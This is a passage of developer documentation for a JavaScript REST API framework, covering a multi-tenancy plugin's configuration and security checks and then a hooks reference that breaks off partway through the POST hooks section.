- **Request-Based Tenant Detection**: Extracts tenant ID from subdomain, header, path, or custom logic
- **Zero Data Leakage**: Makes it impossible to access data from the wrong tenant
- **Flexible Configuration**: Supports various multi-tenancy strategies

## How It Works

The plugin operates at multiple levels to ensure complete data isolation:

### 1. Tenant Extraction (Transport Layer)

When a request arrives, the plugin extracts the tenant ID using a configurable extractor function:

```javascript
// Default: Extract from subdomain
// mobily.app.com → tenant_id = 'mobily'
// acme.app.com → tenant_id = 'acme'
```

### 2. Query Filtering (Database Layer)

Every database query is automatically modified to include the tenant filter:

```sql
-- Original query
SELECT * FROM posts WHERE status = 'published'

-- Modified query (automatic)
SELECT * FROM posts WHERE status = 'published' AND multihome_id = 'mobily'
```

### 3. Record Creation (API Layer)

When creating new records, the tenant ID is automatically set:

```javascript
// User sends:
POST /api/posts
{ "title": "My Post", "content": "..." }

// Plugin automatically adds:
{ "title": "My Post", "content": "...", "multihome_id": "mobily" }
```

## Installation

1. First, ensure you have the required dependencies:

```javascript
import { Api } from 'hooked-api';
import { RestApiPlugin } from './plugins/core/rest-api-plugin.js';
import { RestApiKnexPlugin } from './plugins/core/rest-api-knex-plugin.js';
import { ExpressPlugin } from './plugins/core/connectors/express-plugin.js';
import { MultiHomePlugin } from './plugins/core/multihome-plugin.js';
```

2. Create your API and install the plugins:

```javascript
const api = new Api({ 
  name: 'my-multi-tenant-api',
});

// Install required plugins first
await api.use(RestApiPlugin);
await api.use(RestApiKnexPlugin, { knex: knexInstance });
await api.use(ExpressPlugin, { app: expressApp });

// Install MultiHome plugin
await api.use(MultiHomePlugin, {
  field: 'tenant_id',              // The database field name
  excludeResources: ['migrations'], // Resources to exclude
  requireAuth: true,               // Require tenant context
  allowMissing: false,             // Require field in schema
  extractor: (request) => {        // Custom extraction logic
    // Extract from subdomain
    const host = request.headers.host;
    const subdomain = host.split('.')[0];
    return subdomain;
  }
});
```

3. Add the tenant field to your resource schemas:

```javascript
api.addResource('posts', {
  schema: {
    title: { type: 'string', required: true },
    content: { type: 'string' },
    tenant_id: { type: 'string', required: true } // Required field
  }
});
```

## Configuration

### Plugin Options

| Option | Type | Default | Description |
|--------|------|---------|-------------|
| `field` | string | `'multihome_id'` | The database field name for tenant ID |
| `excludeResources` | array | `['system_migrations', 'system_logs']` | Resources that don't need tenant isolation |
| `requireAuth` | boolean | `true` | Whether to require tenant context for all operations |
| `allowMissing` | boolean | `false` | Whether to allow resources without the tenant field |
| `extractor` | function | Subdomain extractor | Function to extract tenant ID from request |

### Default Extractor

The default extractor tries multiple sources:

1. **Subdomain**: `tenant1.app.com` → `tenant1`
2. **Header**: `X-Multihome-ID: tenant1`
3. Returns `null` if no tenant found

Common subdomains like 'www', 'api', 'app' are ignored.

### Custom Extractors

You can provide your own extractor function:

```javascript
// Extract from JWT token
extractor: (request) => {
  const token = request.headers.authorization?.split(' ')[1];
  if (token) {
    const decoded = jwt.verify(token, secret);
    return decoded.tenant_id;
  }
  return null;
}

// Extract from URL path
extractor: (request) => {
  // /api/tenants/acme/posts → 'acme'
  const match = request.path.match(/\/tenants\/([^\/]+)/);
  return match ? match[1] : null;
}

// Extract from custom header
extractor: (request) => {
  return request.headers['x-tenant-id'];
}

// Complex logic with fallbacks
extractor: (request) => {
  // Try JWT first
  if (request.auth?.claims?.tenant_id) {
    return request.auth.claims.tenant_id;
  }
  
  // Then try subdomain
  const subdomain = request.headers.host?.split('.')[0];
  if (subdomain && !['www', 'api'].includes(subdomain)) {
    return subdomain;
  }
  
  // Finally try header
  return request.headers['x-customer-id'];
}
```

## Usage Examples

### Basic Setup with Subdomain-Based Tenancy

```javascript
// Configuration
await api.use(MultiHomePlugin, {
  field: 'tenant_id',
  extractor: (request) => {
    const host = request.headers.host;
    return host.split('.')[0]; // acme.myapp.com → 'acme'
  }
});

// Define resources with tenant field
api.addResource('projects', {
  schema: {
    name: { type: 'string', required: true },
    description: { type: 'string' },
    tenant_id: { type: 'string', required: true }
  }
});

api.addResource('users', {
  schema: {
    email: { type: 'string', required: true },
    name: { type: 'string', required: true },
    tenant_id: { type: 'string', required: true }
  }
});
```

### Header-Based Tenancy for APIs

```javascript
// Configuration for API clients that send tenant ID in header
await api.use(MultiHomePlugin, {
  field: 'organization_id',
  extractor: (request) => {
    const tenantId = request.headers['x-organization-id'];
    if (!tenantId) {
      throw new Error('X-Organization-ID header is required');
    }
    return tenantId;
  }
});
```

### JWT-Based Tenancy

```javascript
// Works with the JWT Auth plugin
await api.use(JwtAuthPlugin, { secret: process.env.JWT_SECRET });
await api.use(MultiHomePlugin, {
  field: 'company_id',
  extractor: (request) => {
    // JWT plugin sets request.auth
    if (!request.auth?.claims?.company_id) {
      throw new Error('No company context in JWT token');
    }
    return request.auth.claims.company_id;
  }
});
```

### Mixed Mode with System Resources

```javascript
// Some resources are tenant-specific, others are global
await api.use(MultiHomePlugin, {
  field: 'tenant_id',
  excludeResources: [
    'system_settings',    // Global settings
    'countries',          // Shared reference data
    'currencies',         // Shared reference data
    'audit_logs'          // System-wide audit trail
  ],
  allowMissing: true      // Allow resources without tenant_id field
});

// Tenant-specific resource
api.addResource('invoices', {
  schema: {
    number: { type: 'string', required: true },
    amount: { type: 'number', required: true },
    tenant_id: { type: 'string', required: true }
  }
});

// Global resource (no tenant_id)
api.addResource('countries', {
  schema: {
    code: { type: 'string', required: true },
    name: { type: 'string', required: true }
    // No tenant_id field
  }
});
```

## Security Features

### 1. Automatic Query Filtering

Every query is automatically filtered at the database level:

```javascript
// User tries to access another tenant's data
GET /api/posts/123

// Even if post 123 belongs to another tenant, the query becomes:
SELECT * FROM posts WHERE id = 123 AND tenant_id = 'current-tenant'
// Result: 404 Not Found (not a security error message)
```

### 2. Validation on Write Operations

The plugin validates tenant context on all write operations:

```javascript
// User tries to create a record with wrong tenant_id
POST /api/posts
{
  "title": "Hacking attempt",
  "tenant_id": "other-tenant"  // This will be rejected
}

// Error: Cannot set tenant_id to 'other-tenant' - must match current context
```

### 3. Security Logging

Security violations are logged for monitoring:

```javascript
// When someone tries to access wrong tenant data
log.error('Multihome security violation attempt', {
  scopeName: 'posts',
  recordId: 123,
  recordMultihomeId: 'tenant-a',
  contextMultihomeId: 'tenant-b'
});
```

### 4. Fail-Safe Design

If tenant context is missing and `requireAuth: true`:

```javascript
// No tenant context available
GET /api/posts
// Error: No multihome context available - cannot execute query
```

## Integration with Other Plugins

### With JWT Auth Plugin

The MultiHome plugin works seamlessly with JWT authentication:

```javascript
// JWT token contains tenant information
{
  "sub": "user123",
  "email": "user@example.com",
  "tenant_id": "acme-corp",
  "exp": 1234567890
}

// MultiHome extractor uses the JWT claim
await api.use(MultiHomePlugin, {
  extractor: (request) => request.auth?.claims?.tenant_id
});
```

### With Express Plugin

The Express plugin provides the request object that MultiHome uses:

```javascript
// Express middleware sets up request
app.use('/api', (req, res) => {
  // MultiHome extractor receives the Express request object
  // with headers, path, auth, etc.
});
```

### With REST API Plugin

MultiHome integrates at multiple points in the REST API lifecycle:

1. **Before Schema Validation**: Sets tenant_id on new records
2. **Before Data Operations**: Validates tenant access
3. **During Query Building**: Adds WHERE clauses

## API Reference

### Configuration API

```javascript
// Access current configuration
const config = api.multihome.getConfig();
console.log(config);
// {
//   field: 'tenant_id',
//   excludeResources: ['migrations'],
//   requireAuth: true,
//   allowMissing: false,
//   hasCustomExtractor: true
// }
```

### Variables

The plugin sets these variables accessible via `api.vars.multihome`:

- `field`: The tenant ID field name
- `excludeResources`: Array of excluded resource names
- `requireAuth`: Whether tenant context is required
- `allowMissing`: Whether resources can omit the tenant field

### Helpers

- `helpers.extractMultihomeId(request)`: The configured extractor function

### Hooks

The plugin adds these hooks:

| Hook | When | Purpose |
|------|------|---------|
| `transport:request` | Every request | Extract tenant ID from request |
| `scope:added` | Resource creation | Validate tenant field exists |
| `knexQueryFiltering` | Database queries | Add WHERE clause for tenant |
| `beforeSchemaValidate` | Before validation | Set tenant_id on new records |
| `beforeDataGet/Put/Patch/Delete` | Before operations | Additional security validation |

## Troubleshooting

### Common Issues

#### 1. "No multihome context available"

**Cause**: The extractor couldn't find a tenant ID in the request.

**Solutions**:
- Check your extractor function is returning a value
- Verify the subdomain/header/token contains tenant information
- Set `requireAuth: false` if some operations don't need tenant context

#### 2. "Resource must have 'tenant_id' field in schema"

**Cause**: A resource is missing the tenant field in its schema.

**Solutions**:
- Add the field to the schema
- Add the resource to `excludeResources` if it's global
- Set `allowMissing: true` if you have mixed resources

#### 3. "Cannot set tenant_id to X - must match current context Y"

**Cause**: Trying to set a different tenant_id than the current context.

**Solution**: Don't include tenant_id in your requests - it's set automatically.

#### 4. Queries returning no results

**Cause**: Data exists but with different tenant_id.

**Debugging**:
```javascript
// Check current tenant context
api.on('transport:request', (context) => {
  console.log('Current tenant:', context.auth?.multihome_id);
});

// Check query modifications
api.on('knexQueryFiltering', (context) => {
  console.log('Query SQL:', context.knexQuery.query.toString());
});
```

### Debug Mode

Enable detailed logging to troubleshoot:

```javascript
const api = new Api({
  name: 'my-api',
  logging: { level: 'trace' }
});
```

## Best Practices

### 1. Schema Design

Always include the tenant field in your schemas:

```javascript
// Good
api.addResource('orders', {
  schema: {
    order_number: { type: 'string', required: true },
    total: { type: 'number', required: true },
    tenant_id: { type: 'string', required: true } // Always include
  }
});
```

### 2. Consistent Field Naming

Use the same tenant field name across all resources:

```javascript
// Configure once
await api.use(MultiHomePlugin, { field: 'tenant_id' });

// Use everywhere
// ✓ Good: All resources use 'tenant_id'
// ✗ Bad: Some use 'tenant_id', others use 'company_id'
```

### 3. Validation in Extractors

Add validation to your extractor functions:

```javascript
extractor: (request) => {
  const tenantId = request.headers['x-tenant-id'];
  
  if (!tenantId) {
    throw new Error('X-Tenant-ID header is required');
  }
  
  if (!/^[a-z0-9-]+$/.test(tenantId)) {
    throw new Error('Invalid tenant ID format');
  }
  
  return tenantId;
}
```

### 4. Migration Strategy

When adding multi-tenancy to an existing application:

1. Add the tenant field to all tables
2. Populate existing data with a default tenant
3. Enable the plugin with `allowMissing: true` initially
4. Gradually update all resources
5. Switch to `allowMissing: false` when complete

### 5. Testing

Test with multiple tenants:

```javascript
describe('Multi-tenancy', () => {
  it('isolates data between tenants', async () => {
    // Create data for tenant A
    const resA = await fetch('https://tenant-a.app.com/api/posts', {
      method: 'POST',
      body: JSON.stringify({ title: 'Tenant A Post' })
    });
    
    // Try to access from tenant B
    const resB = await fetch('https://tenant-b.app.com/api/posts/' + resA.id);
    expect(resB.status).toBe(404); // Should not find
  });
});
```

### 6. Performance Considerations

The tenant field should be indexed for performance:

```sql
CREATE INDEX idx_posts_tenant_id ON posts(tenant_id);
CREATE INDEX idx_posts_tenant_status ON posts(tenant_id, status);
```

## Complete Example

Here's a complete multi-tenant API setup:

```javascript
import { Api } from 'hooked-api';
import { RestApiPlugin } from './plugins/core/rest-api-plugin.js';
import { RestApiKnexPlugin } from './plugins/core/rest-api-knex-plugin.js';
import { ExpressPlugin } from './plugins/core/connectors/express-plugin.js';
import { JwtAuthPlugin } from './plugins/core/jwt-auth-plugin.js';
import { MultiHomePlugin } from './plugins/core/multihome-plugin.js';
import knex from 'knex';
import express from 'express';

// Initialize
const app = express();
const db = knex({
  client: 'postgresql',
  connection: process.env.DATABASE_URL
});

// Create API
const api = new Api({ 
  name: 'saas-api', 
  logging: { level: 'info' }
});

// Install plugins
await api.use(RestApiPlugin);
await api.use(RestApiKnexPlugin, { knex: db });
await api.use(ExpressPlugin, { app });
await api.use(JwtAuthPlugin, { 
  secret: process.env.JWT_SECRET 
});

// Configure multi-tenancy
await api.use(MultiHomePlugin, {
  field: 'tenant_id',
  excludeResources: ['system_health', 'public_content'],
  requireAuth: true,
  allowMissing: false,
  extractor: (request) => {
    // Try multiple sources
    // 1. JWT token (preferred)
    if (request.auth?.claims?.tenant_id) {
      return request.auth.claims.tenant_id;
    }
    
    // 2. Subdomain (fallback)
    const host = request.headers.host || '';
    const subdomain = host.split('.')[0];
    if (subdomain && !['www', 'api', 'app'].includes(subdomain)) {
      return subdomain;
    }
    
    // 3. Header (API clients)
    if (request.headers['x-tenant-id']) {
      return request.headers['x-tenant-id'];
    }
    
    // No tenant found
    throw new Error('Unable to determine tenant context');
  }
});

// Define tenant-specific resources
api.addResource('projects', {
  schema: {
    name: { type: 'string', required: true },
    description: { type: 'string' },
    status: { type: 'string', defaultTo: 'active' },
    tenant_id: { type: 'string', required: true }
  }
});

api.addResource('team_members', {
  schema: {
    email: { type: 'string', required: true },
    name: { type: 'string', required: true },
    role: { type: 'string', defaultTo: 'member' },
    tenant_id: { type: 'string', required: true }
  }
});

// Start server
app.listen(3000, () => {
  console.log('Multi-tenant API running on port 3000');
}).on('error', (err) => {
  console.error('Failed to start server:', err);
  process.exit(1)
});
```

Now your API automatically:
- Extracts tenant ID from JWT tokens, subdomains, or headers
- Filters all queries by tenant
- Sets tenant_id on new records
- Prevents cross-tenant data access
- Logs security violations

The MultiHome plugin makes multi-tenancy transparent to your application logic while ensuring complete data isolation.# Hooks and Data Management

This guide provides a comprehensive reference for all hooks available in the json-rest-api system, including system-wide hooks from hooked-api and method-specific hooks from the REST API plugin.

An important concept when working with hooks is understanding how simplified mode affects data flow.

Inside hooks, JSON:API format is king _regardless of simplified mode_.
Simplified mode only ever affects:
  - **Input**: How parameters are passed to the API (simplified data is converted to JSON:API before entering the lifecycle)
  - **Output**: How the record is returned to the client (JSON:API data is converted to simplified format before returning)
Hook context _always_ contains: Full JSON:API formatted records with `data`, `type`, `attributes`, and `relationships`. So, as far as the hooks are concerned, `context.inputRecord` is _always_ a full JSON:API object.

This means when writing hooks, you always work with the standard JSON:API structure:
```javascript
// In a hook, the record is ALWAYS JSON:API format:
hooks: {
  beforeData: async ({ context }) => {
    // Even in simplified mode, inputRecord has JSON:API structure
    if (context.method === 'post' && context.inputRecord) {
      // Always access via data.attributes
      context.inputRecord.data.attributes.created_at = new Date().toISOString();
    }
  },
  
  // IMPORTANT: Use enrichAttributes to modify attributes, NOT enrichRecord
  enrichAttributes: async ({ context }) => {
    // This is called for ALL records (main and included/child records)
    // Add computed fields directly to context.attributes
    context.attributes.computed_field = 'value';
    context.attributes.word_count = context.attributes.content?.split(' ').length || 0;
  }
}
```

One of the main practical use of hooks is to manupulate data before it's committed to the database.

## Customizing the API as a whole with customize()

The `customize()` method is the primary way to extend your API with hooks, variables, and helper functions. This method is available on the API instance and provides a cleaner alternative to calling individual methods like `addHook()`.

The `customize()` method accepts an object with the following properties:
- `hooks` - Hook handlers for various lifecycle events
- `vars` - Variables accessible throughout the API
- `helpers` - Reusable functions
- `apiMethods` - Methods added to the API instance
- `scopeMethods` - Methods added to _all_ scopes/resources

### Basic Example

The `customize()` method accepts an object with hooks, vars (shared state), helpers (reusable functions), apiMethods (global methods), and scopeMethods (methods for all scopes):

```javascript
api.customize({
  // Shared variables accessible throughout the API
  vars: {
    appName: 'My Application',
    userRoles: ['admin', 'editor', 'viewer'],
    environment: process.env.NODE_ENV
  },
  
  // Reusable helper functions
  helpers: {
    formatDate: (date) => new Date(date).toLocaleDateString(),
    validateEmail: (email) => /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email),
    hashPassword: async (password) => {
      const salt = await bcrypt.genSalt(10);
      return bcrypt.hash(password, salt);
    }
  },
  
  // Hooks for customizing behavior
  hooks: {
    beforeData: async ({ context, vars, helpers, log }) => {
      log.info(`${context.method} operation on ${context.scopeName}`);
      
      // Use vars for configuration
      if (vars.environment === 'production') {
        // Production-specific logic
      }
      
      // Modify data for POST requests
      if (context.method === 'post' && context.inputRecord) {
        // Set timestamps
        context.inputRecord.data.attributes.created_at = new Date().toISOString();
        
        // Validate and transform data using helpers
        if (context.scopeName === 'users') {
          // Hash password
          if (context.inputRecord.data.attributes.password) {
            context.inputRecord.data.attributes.password = await helpers.hashPassword(
              context.inputRecord.data.attributes.password
            );
          }
        
        }
      }
    },
    
    enrichAttributes: async ({ context }) => {
      // Add computed fields to posts
      if (context.scopeName === 'posts') {
        // NOTE that 'preview' MUST be an existing record on the database
        context.attributes.preview = context.attributes.content?.substring(0, 200) + '...';
      }
    }
  },
  
  // API-level methods: api.methodName()
  apiMethods: {
    healthCheck: async ({ vars, scopes }) => ({
      status: 'ok',
      environment: vars.environment,
      timestamp: new Date().toISOString(),
      resources: Object.keys(scopes)
    })
  },
  
  // Scope methods: api.scopes.resourceName.methodName()
  scopeMethods: {
    count: async ({ scopeName, db }) => {
      const result = await db(scopeName).count('* as total').first();
      return result.total;
    }
  }
});

// Usage examples:
const health = await api.healthCheck();
const userCount = await api.scopes.users.count();
```

**Important**: Hooks added via `customize()` are registered with the plugin name `api-custom:{apiName}` for tracking purposes.

## Customizing Resources with extras (per resource)

While `customize()` applies globally to all resources, you can customize individual resources using the `extras` parameter in `addScope()`. This provides resource-specific hooks, methods, variables, and helpers that apply **only to that particular resource**.

### Using extras in addScope

```javascript
api.addScope('posts', {
  // Schema and options
}, {
  // extras parameter - everything here applies ONLY to posts
  hooks: {

    // This will change data before getting posted
    beforeDataPost: async ({ context }) => {
      const attributes = context.inputRecord.data.attributes
      // This hook only runs for POST operations on posts
      attributes.created_at = new Date().toISOString();
    },
    
    // This will enrich all attributes (main and included) when fetched
    // It's for adding computed fields to the RESPONSE, NOT for saving to database
    // These computed fields are sent to the client but never stored 
    enrichAttributes: async ({ context }) => {  
      // This wordCount is calculated on-the-fly and included in the response
      // It is NOT saved to the database
      context.attributes.wordCount = context.attributes.content?.split(' ').length || 0;
      
      // Example: Add a reading time estimate (also not stored)
      const wordsPerMinute = 200;
      context.attributes.readingTimeMinutes = Math.ceil(context.attributes.wordCount / wordsPerMinute);
    }
  },
  
  // CLAUDE: NO. This should use patch, since direct database operations
  // will skip the lifecycle (e.g. Sockets notifications etc.)
  scopeMethods: {
    // This method is ONLY available on posts: api.scopes.posts.publish()
    publish: async ({ params, context, db, runHooks }) => {
      const id = params.id;
      const result = await db('posts')
        .where('id', id)
        .update({ 
          status: 'published',
          published_at: new Date().toISOString()
        });
      return { success: true, published: result };
    },
    
    // Only on posts: api.scopes.posts.findByAuthor()
    findByAuthor: async ({ params, scope }) => {
      return await scope.query({
        filters: { author_id: params.authorId }
      });
    }
  },
  
  vars: {
    // Resource-specific configuration
    maxTitleLength: 200,
    allowedStatuses: ['draft', 'published', 'archived'],
    defaultStatus: 'draft'
  },
  
  helpers: {
    // Resource-specific helper functions
    generateSlug: (title) => {
      return title.toLowerCase()
        .replace(/[^a-z0-9]+/g, '-')
        .replace(/^-|-$/g, '');
    },
    
    validateStatus: (status, vars) => {
      // Note: can access vars through second parameter
      return vars.allowedStatuses.includes(status);
    }
  }
});
```

### Variable and Helper Fallback System

An important feature of resource-specific vars and helpers is the **fallback system**:

1. **Variables (vars)**: When you access a variable in a resource context, it first checks the resource's vars. If not found, it falls back to the global API vars.

```javascript
// Global vars
api.customize({
  vars: {
    appName: 'My Blog',
    defaultPageSize: 20,
    maxUploadSize: 5242880  // 5MB
  }
});

// Resource-specific vars
api.addScope('posts', {}, {
  vars: {
    defaultPageSize: 10,  // Override for posts only
    maxTitleLength: 200   // Posts-specific var
  }
});

// In a posts hook or method:
// vars.defaultPageSize → 10 (from posts vars)
// vars.maxUploadSize → 5242880 (fallback to global)
// vars.maxTitleLength → 200 (posts-specific)
// vars.appName → 'My Blog' (fallback to global)
```

2. **Helpers**: Same fallback behavior - resource helpers are checked first, then global helpers.

```javascript
// Global helpers
api.customize({
  helpers: {
    formatDate: (date) => new Date(date).toLocaleDateString(),
    sanitizeHtml: (html) => { /* ... */ }
  }
});

// Resource-specific helpers
api.addScope('posts', {}, {
  helpers: {
    formatDate: (date) => new Date(date).toISOString(), // Override for posts
    generateExcerpt: (content) => content.substring(0, 150) + '...'
  }
});

// In posts context:
// helpers.formatDate() → uses posts version (ISO format)
// helpers.sanitizeHtml() → uses global version (fallback)
// helpers.generateExcerpt() → posts-specific helper
```

This means that you are able to specify api-wide variables and helpers, but can then override them by resource.

### Resource-Specific vs Global Customization

| Feature | Global (`customize()`) | Resource-Specific (`extras`) |
|---------|----------------------|----------------------------|
| **Scope** | Applies to all resources | Applies to one resource only |
| **Hooks** | Must check `context.scopeName` | Automatically scoped |
| **Methods** | `apiMethods` → `api.methodName()`<br>`scopeMethods` → all scopes | `scopeMethods` → only this scope |
| **Vars** | Global defaults | Resource-specific with fallback |
| **Helpers** | Global utilities | Resource-specific with fallback |


### Best Practices for Resource Customization

1. **Use extras for resource-specific logic** - Don't clutter global hooks with scopeName checks
2. **Leverage the fallback system** - Define common utilities globally, override when needed
3. **Keep resource methods focused** - Methods should relate to that specific resource
4. **Document resource-specific vars** - Make it clear what configuration is available
5. **Avoid naming conflicts** - Be aware that resource vars/helpers can shadow global ones

### Best Practices for Global Customization

1. **Check scopeName in Hooks** - Since customize() is API-level only, use `context.scopeName` to implement resource-specific logic
2. **Keep Helpers Pure** - Make helpers independent functions that are easier to test and reuse
3. **Use Vars for Configuration** - Store configuration values in vars instead of hardcoding them
4. **Avoid Mutable Shared State** - Be careful with objects/arrays in vars as they're shared across all requests
5. **Handle Errors Gracefully** - Thrown errors in hooks will stop the operation and return to the client
6. **Use Method-Specific Hooks** - Use `beforeDataPost`, `afterDataPatch`, etc. for operation-specific logic


## REST API Method Hooks

These hooks are triggered by the REST API plugin during CRUD operations. Each method follows a consistent pattern but with method-specific variations.

### Important Context Properties

The context object contains different properties depending on the method and stage of execution:

**Common Properties**:
- `method` (string) - The HTTP method: 'query', 'get', 'post', 'put', 'patch', or 'delete'
- `simplified` (boolean) - Whether simplified mode is active (affects input/output format, not hook data)
- `schemaInfo` (object) - Compiled schema information containing:
  - `schema` - The full schema object
  - `searchSchema` - Schema for filtering (query method)
  - `tableName` - Database table name
  - `idProperty` - Primary key field name
  - `schemaRelationships` - Relationship definitions
- `scopeName` (string) - Name of the current resource scope
- `transaction` (object/null) - Database transaction if provided
- `db` (object) - Database connection (knex instance or transaction)
- `auth` (object) - Authentication context if provided

**Write Operation Properties** (POST/PUT/PATCH):
- `inputRecord` (object) - The JSON:API formatted input containing:
  - `data.type` - Resource type
  - `data.attributes` - Resource attributes (this is where you modify input data)
  - `data.relationships` - Resource relationships
- `belongsToUpdates` (object) - Foreign key updates extracted from relationships
- `returnRecordSetting` (object) - Configuration for what to return

**Query/Read Properties**:
- `queryParams` (object) - Query parameters containing:
  - `fields` - Sparse fieldset selections
  - `include` - Relationships to include
  - `sort` - Sort fields array (query only)
  - `page` - Pagination settings (query only)
  - `filters` - Filter conditions (query only)
- `record` (object) - The fetched/created record in JSON:API format
- `originalRecord` (object) - Backup of the record before modifications

### Hook Execution Pattern

All REST API methods follow this general pattern:

1. **Before hooks** - Run before the main operation
2. **Permission checks** - For GET method
3. **Main operation** - The actual database operation
4. **After hooks** - Run after the operation
5. **Enrichment hooks** - To enhance the record
6. **Transaction hooks** - Commit/rollback for write operations
7. **Finish hooks** - Final cleanup/processing

## QUERY Method Hooks

Used for retrieving collections of resources with filtering, sorting, and pagination.

### beforeData

**When**: Before executing the database query  
**Purpose**: Modify query parameters, add custom filters, set defaults

**Context contains**:
- `method` (string) - "query"
- `simplified` (boolean) - Whether simplified mode is active (affects input/output format, not hook data)
- `schemaInfo` (object) - Compiled schema information
  - `schema` - Full schema object
  - `searchSchema` - Schema for filtering
  - `tableName` - Database table name
  - `idProperty` - Primary key field name
- `queryParams` (object) - Query parameters
  - `fields` - Sparse fieldset selections
  - `include` - Relationships to include
  - `sort` - Sort fields array
  - `page` - Pagination settings
  - `filters` - Filter conditions
- `transaction` (object/null) - Database transaction if provided
- `db` (object) - Database connection (knex instance or transaction)
- `scopeName` (string) - Name of the current scope
- `sortableFields` (array) - Fields allowed for sorting
- `auth` (object) - Authentication context if provided

**What can be changed**:
- `queryParams.filters` - Modify filter conditions  
- `queryParams.sort` - Modify sort order
- `queryParams.page` - Modify pagination
- `queryParams.fields` - Modify field selection
- `queryParams.include` - Modify includes
- Any custom properties added to context

**Example**:
```javascript
// In api.addScope('posts', {}, extras):
hooks: {
  beforeData: async ({ context }) => {
    if (context.method === 'query' && context.auth?.userId) {
      // Only show posts by the current user
      context.queryParams.filters = {
        ...context.queryParams.filters,
        author_id: context.auth.userId
      };
    }
  }
}
```

### beforeDataQuery

**When**: Immediately after `beforeData`, query-specific  
**Purpose**: Query-specific modifications

**Context**: Same as `beforeData`  
**What can be changed**: Same as `beforeData`

### enrichRecord

**When**: After data is fetched from database and normalized  
**Purpose**: Modify the response structure, add metadata, or handle response-level concerns

**IMPORTANT**: Do NOT use this hook to add/modify attributes. Use `enrichAttributes` instead.

**Context contains**:
- All previous context properties
- `record` (object) - The JSON:API formatted response
  - `data` - Array of resource objects
  - `included` - Array of included resources
  - `meta` - Metadata (pagination, etc.)
  - `links` - Pagination links
- `originalRecord` (object) - Backup of the record before enrichment

**What can be changed**:
- `record.meta` - Add or modify metadata
- `record.links` - Modify links
- Response structure modifications (but NOT attributes)
- Should NOT modify attributes - use `enrichAttributes` hook instead

**Example**:
```javascript
hooks: {
  enrichAttributes: async ({ context }) => {
    if (context.parentContext?.method === 'query') {
      // Add computed fields that are NOT stored in database
      // These are calculated fresh for each response
      context.attributes.wordCount = context.attributes.content?.split(' ').length || 0;
      context.attributes.excerpt = context.attributes.content?.substring(0, 150) + '...';
      
      // Transform display values (original remains in database)
      // Database still has lowercase title, this is just for this response
      context.attributes.displayTitle = context.attributes.title?.toUpperCase();
    }
  }
}
```

### finish

**When**: Before returning the response  
**Purpose**: Final logging, metrics collection

**Context contains**: All previous context properties  
**What can be changed**: Nothing - hooks should NOT change `context.record` at this stage

### finishQuery

**When**: Immediately after `finish`, query-specific  
**Purpose**: Query-specific final processing

**Context**: Same as `finish`  
**What can be changed**: Nothing - informational only

## GET Method Hooks

Used for retrieving a single resource by ID.

### beforeData

**When**: Before fetching the single resource  
**Purpose**: Modify query parameters, prepare for fetch

**Context contains**:
- `method` (string) - "get"
- `simplified` (boolean) - Whether simplified mode is active (affects input/output format, not hook data)
- `schemaInfo` (object) - Compiled schema information
- `queryParams` (object) - Query parameters
  - `fields` - Sparse fieldset selections
  - `include` - Relationships to include
- `transaction` (object/null) - Database transaction if provided
- `db` (object) - Database connection
- `scopeName` (string) - Name of the current scope
- `id` (string/number) - The ID of the resource to fetch
- `minimalRecord` (object) - Minimal record fetched for authorization
- `auth` (object) - Authentication context if provided

**What can be changed**:
- `queryParams.fields` - Modify field selection
- `queryParams.include` - Modify includes
- Custom context properties

### beforeDataGet

**When**: Immediately after `beforeData`, get-specific  
**Context**: Same as `beforeData`  
**What can be changed**: Same as `beforeData`

### checkDataPermissions

**When**: After the record is fetched, before enrichment  
**Purpose**: Implement row-level security, check access permissions

**Context contains**:
- All previous context properties
- `record` (object) - The fetched JSON:API record

**What can be changed**:
- Can throw errors to deny access
- Should NOT modify the record

**Example**:
```javascript
hooks: {
  checkDataPermissions: async ({ context }) => {
    if (context.method === 'get') {
      const post = context.record.data;
      if (post.attributes.status === 'draft' && post.attributes.author_id !== context.auth?.userId) {
        throw new Error('Access denied: Cannot view draft posts by other authors');
      }
    }
  }
}
```

### checkDataPermissionsGet

**When**: Immediately after `checkDataPermissions`, get-specific  
**Context**: Same as `checkDataPermissions`  
**What can be changed**: Same as `checkDataPermissions`

### enrichRecord

**When**: After permission checks  
**Purpose**: Modify the response structure or add metadata

**IMPORTANT**: Do NOT use this hook to add/modify attributes. Use `enrichAttributes` instead.

**Context contains**:
- All previous context properties
- `record` (object) - The JSON:API formatted response
- `originalRecord` (object) - Backup of the record
- `computedDependencies` (object) - Fields needed for computed fields

**What can be changed**:
- Response structure (but NOT attributes)
- `record.meta` - Add metadata
- Should NOT modify attributes - use `enrichAttributes` hook instead

### enrichRecordWithRelationships

**When**: After basic enrichment  
**Purpose**: Add relationship metadata, enhance relationship data

**Context**: Same as `enrichRecord`  
**What can be changed**:
- Can modify relationship data
- Can add relationship metadata

### finish

**When**: Before returning the response  
**Context**: All accumulated context  
**What can be changed**: Nothing - informational only

### finishGet

**When**: Immediately after `finish`, get-specific  
**Context**: Same as `finish`  
**What can be changed**: Nothing - informational only

## POST Method Hooks

Used for creating new resources.

### beforeData

**When**: Before creating the new resource  
**Purpose**: Validate data, set defaults, compute values

**Context contains**:
- `method` (string) - "post"
- `simplified` (boolean) - Whether simplified mode is active (affects input/output format, not hook data)
- `schemaInfo` (object) - Compiled schema information
- `inputRecord` (object) - The JSON:API formatted input data
  - `data.type` - Resource type
  - `data.attributes` - Resource attributes
  - `data.relationships` - Resource relationships
- `params` (object) - Original parameters (may contain `returnFullRecord`)
- `queryParams` (object) - Contains `fields`, `include` for response
- `transaction` (object) - Database transaction (created if not provided)
- `shouldCommit` (boolean) - Whether to commit the transaction
- `db` (object) - Database connection
- `scopeName` (string) - Name of the current scope
- `returnRecordSetting` (object) - Settings for what to return
  - `post` - 'no', 'minimal', or 'full'
  - `put` - 'no', 'minimal', or 'full'
  - `patch` - 'no', 'minimal', or 'full'
- `auth` (object) - Authentication context if provided

**What can be changed**:
- `inputRecord.data.attributes` - Modify validated attributes before insert
- `belongsToUpdates` - Modify foreign key values (but these are usually already merged into attributes)
- Custom context properties
- Can set defaults or compute values

**Note**: After validation, attributes are stored in `context.inputRecord.data.attributes`, not directly in `context.attributes`.

**Example**:
```javascript
hooks: {
  beforeData: async ({ context }) => {
    if (context.method === 'post' && context.inputRecord) {
      // Set default status
      if (!context.inputRecord.data.attributes.status) {
        context.inputRecord.data.attributes.status = 'draft';
      }
      
      // Set author from auth context (this would typically be in belongsToUpdates)
      if (context.auth?.userId && context.belongsToUpdates) {
        context.belongsToUpdates.author_id = context.auth.userId;
      }
      
      // Add creation timestamp
